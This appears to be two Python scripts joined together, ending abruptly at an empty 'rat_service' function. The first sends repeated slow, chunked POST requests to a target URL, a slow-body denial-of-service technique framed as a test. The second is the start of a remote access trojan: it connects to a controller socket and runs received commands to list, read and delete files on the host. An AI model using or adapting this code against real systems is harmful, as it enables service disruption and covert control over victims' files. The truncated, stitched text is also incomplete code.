import http.client
import urllib.parse
import time
import os
import sys
from datetime import datetime, timedelta

LOG_DIR = './target'
LOG_FILE = os.path.join(LOG_DIR, 'network_requests.log')

DEFAULT_DURATION = 30  # default duration in seconds
DEFAULT_URL = "http://example.com"  # default URL for testing
DEFAULT_PAYLOAD = "key=value"  # default payload

def ensure_log_directory_exists():
    try:
        os.makedirs(LOG_DIR, exist_ok=True)
    except Exception as e:
        print("Failed to create log directory:", e)

def log_request_attempt(timestamp, url, status=None, error=None):
    try:
        with open(LOG_FILE, 'a') as log_file:
            if error:
                log_file.write(f"{timestamp} | URL: {url} | ERROR: {error}\n")
            else:
                log_file.write(f"{timestamp} | URL: {url} | STATUS: {status}\n")
    except Exception as e:
        print("Failed to write to log file:", e)

def send_slow_post_request(url, payload, chunk_size=10, delay=0.5):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.scheme not in ('http', 'https'):
            raise ValueError("Invalid URL scheme. Use 'http' or 'https'.")

        connection = (http.client.HTTPSConnection if parsed_url.scheme == 'https' 
                      else http.client.HTTPConnection)(parsed_url.netloc)

        path = parsed_url.path or '/'
        connection.connect()
        connection.putrequest("POST", path)
        connection.putheader("Content-Type", "application/x-www-form-urlencoded")
        connection.putheader("Content-Length", str(len(payload)))
        connection.endheaders()

        for i in range(0, len(payload), chunk_size):
            connection.send(payload[i:i + chunk_size].encode('utf-8'))
            time.sleep(delay)

        response = connection.getresponse()
        status = f"{response.status} {response.reason}"
        body = response.read().decode('utf-8')
        print("Response status:", response.status)
        print("Response reason:", response.reason)
        print("Response body:", body)
        log_request_attempt(timestamp, url, status=status)
    except ValueError as ve:
        print("Error:", ve)
        log_request_attempt(timestamp, url, error=str(ve))
    except Exception as e:
        print("Error occurred:", e)
        log_request_attempt(timestamp, url, error=str(e))
    finally:
        if 'connection' in locals():
            connection.close()

def validate_duration(duration):
    try:
        return int(duration)
    except ValueError:
        raise ValueError("Duration must be a positive integer representing seconds.")

def main():
    ensure_log_directory_exists()

    if len(sys.argv) > 2:
        print("Usage: python program.py [duration_in_seconds]")
        sys.exit(1)

    # Default values for silent execution
    duration_seconds = DEFAULT_DURATION
    target_url = DEFAULT_URL
    payload = DEFAULT_PAYLOAD

    # If a duration is provided as an argument, use it instead
    if len(sys.argv) == 2:
        try:
            duration_seconds = validate_duration(sys.argv[1])
            if duration_seconds <= 0:
                raise ValueError("Duration must be greater than 0.")
        except ValueError as e:
            print("Error:", e)
            sys.exit(1)

    end_time = datetime.now() + timedelta(seconds=duration_seconds)

    while datetime.now() < end_time:
        send_slow_post_request(target_url, payload)
        time.sleep(1)  # Pause between requests to avoid excessive traffic

    print("Test completed.")

if __name__ == "__main__":
    main()

import os
import sys
import json
import time
import socket
import threading
import subprocess
import platform
import shutil

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 9000
BUFFER_SIZE = 1024

def list_files(directory):
    try:
        files = os.listdir(directory)
        return "\n".join(files)
    except FileNotFoundError:
        return f"Error: Directory '{directory}' does not exist."
    except PermissionError:
        return f"Error: Permission denied for directory '{directory}'."

def read_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            return file.read()
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied for file '{file_path}'."
    except Exception as e:
        return f"Error reading file '{file_path}': {e}"

def delete_file(file_path):
    try:
        os.remove(file_path)
        return f"File '{file_path}' deleted."
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied to delete file '{file_path}'."
    except Exception as e:
        return f"Error deleting file '{file_path}': {e}"

def embed_metadata(file_path):
    metadata = {
        "unique_id": os.path.basename(file_path),
        "last_modified": time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(os.path.getmtime(file_path))),
    }
    try:
        with open(file_path, 'a', encoding='utf-8') as file:
            file.write("\n---METADATA---\n")
            file.write(json.dumps(metadata))
        return f"Metadata added to '{file_path}'."
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied to modify file '{file_path}'."
    except Exception as e:
        return f"Error embedding metadata into file '{file_path}': {e}"

def read_metadata(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            lines = file.readlines()
        if "---METADATA---\n" in lines:
            metadata_index = lines.index("---METADATA---\n") + 1
            metadata = json.loads("".join(lines[metadata_index:]))
            return f"Metadata for '{file_path}': {metadata}"
        else:
            return f"No metadata found in '{file_path}'."
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied to read file '{file_path}'."
    except Exception as e:
        return f"Error reading metadata from file '{file_path}': {e}"

def handle_command(command, args):
    if command == "list":
        return list_files(args)
    elif command == "read":
        return read_file(args)
    elif command == "delete":
        return delete_file(args)
    elif command == "embed_metadata":
        return embed_metadata(args)
    elif command == "read_metadata":
        return read_metadata(args)
    else:
        return f"Error: Unknown command '{command}'."

def server_handler():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            print(f"Connected to server at {SERVER_HOST}:{SERVER_PORT}")
            while True:
                message = client_socket.recv(BUFFER_SIZE).decode('utf-8')
                if not message:
                    break
                print(f"Received command: {message}")
                try:
                    data = json.loads(message)
                    command = data.get("command")
                    args = data.get("args", "")
                    result = handle_command(command, args)
                except Exception as e:
                    result = f"Error processing command: {e}"
                client_socket.sendall(result.encode('utf-8'))
    except Exception as e:
        print(f"Error connecting to server: {e}")

def rat_service():
